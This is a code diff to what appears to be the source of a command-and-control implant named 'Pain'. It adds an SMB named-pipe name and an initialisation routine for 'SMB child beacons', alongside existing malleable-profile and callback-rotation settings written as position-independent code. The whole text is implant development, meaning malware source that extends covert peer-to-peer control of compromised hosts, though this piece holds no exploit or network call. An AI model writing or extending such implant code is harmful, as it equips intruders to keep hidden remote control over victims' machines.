@@ -73,6 +73,9 @@ DECLFN BYTE   g_MalleableBytes[]  = PAIN_MALLEABLE_BYTES;
 DECLFN UINT32 g_CallbackCount     = PAIN_CALLBACK_COUNT;
 DECLFN UINT32 g_RotationStrategy  = PAIN_ROTATION;
 
+// SMB pipe name as byte array - same pattern as PAIN_MALLEABLE_BYTES, no backslash issues
+DECLFN BYTE   g_PipeName[]        = PAIN_PIPE_NAME;
+
 // Malleable_Init lives here (same TU as the globals) so the compiler uses
 // RIP-relative addressing for g_MalleableBytes/g_CallbackCount/g_RotationStrategy.
 // Cross-TU access goes through .refptr stubs that hold unrelocated linked addresses, breaking G_SYM.  Same-TU access uses [rip+offset] - no G_SYM needed.
@@ -172,3 +175,30 @@ DECLFN_CODE VOID Malleable_Init()
     Self->Ntdll.DbgPrint( "[Pain] Malleable_Init: done - %d callbacks, rotation=%d\n",
                           count, strategy );
 }
+
+// Initialise the named-pipe config for SMB child beacons.
+// Reads g_PipeName (same TU → RIP-relative, correct at runtime) and
+// copies it to a heap string so the beacon loop can reference Self->Config.PipeName.
+// Called from Agent::Init() when PAIN_PROFILE_C2 == PROFILE_SMB.
+#if PAIN_PROFILE_C2 == PROFILE_SMB
+DECLFN_CODE VOID Config_Smb_Init()
+{
+    G_AGENT;
+
+    // g_PipeName is in the same TU - direct access is RIP-relative, no G_SYM needed
+    UINT32 pipe_len = 0;
+    while ( g_PipeName[pipe_len] ) pipe_len++;
+
+    Self->Config.PipeName = (PCHAR)Heap_Alloc( pipe_len + 1 );
+    if ( Self->Config.PipeName ) {
+        Mem_Copy( Self->Config.PipeName, g_PipeName, pipe_len );
+        Self->Config.PipeName[pipe_len] = '\0';
+    }
+
+    Self->Config.PipeHandle = nullptr;
+    Self->Config.TasksRead  = FALSE;
+    Self->Config.SmbNode    = nullptr;
+
+    Self->Ntdll.DbgPrint( "[SMB] Config_Smb_Init: pipe=%s\n", Self->Config.PipeName );
+}
+#endif
